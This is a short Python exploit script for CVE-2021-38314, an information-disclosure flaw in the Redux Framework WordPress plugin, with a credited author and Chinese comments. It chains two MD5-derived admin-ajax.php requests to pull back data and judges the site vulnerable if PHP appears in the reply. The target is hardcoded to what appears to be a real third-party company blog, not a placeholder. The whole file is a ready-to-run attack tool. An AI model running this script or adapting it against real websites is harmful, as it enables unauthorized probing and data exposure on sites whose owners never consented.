import requests, hashlib, json, sys

# python cve-2021-38314.py [ url vulnerable]
# exm:
#       python cve-2021-38314.py https://vulnerable-site.com
#
#参考文章:https://forum.butian.net/share/947
# Exploit by phr4nt0m
#

target = "http://blog.bitso.com"

url1 = target + '/-redux'  
md5_redux = hashlib.md5(url1.encode()).hexdigest()
ua={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'}
get_key = requests.get( target + '/wp-admin/admin-ajax.php?action=' + md5_redux ,headers=ua).text
print("第一个md5:",get_key)
key_support = get_key + '-support' 
md5_key = hashlib.md5(key_support.encode()).hexdigest()
print('第二个md5:',md5_key)
vuln_target = target + '/wp-admin/admin-ajax.php?action=' + md5_key #+ '&code=' + redux_code
file_1 = requests.get(vuln_target,headers=ua).text
print("CVE-2021-38314")
print (" Target: " + target )
print (" Vulnerable link: " + vuln_target + "\n\n")
print("返回结果:")
#如果返回信息存在php则表示漏洞存在
print(file_1)
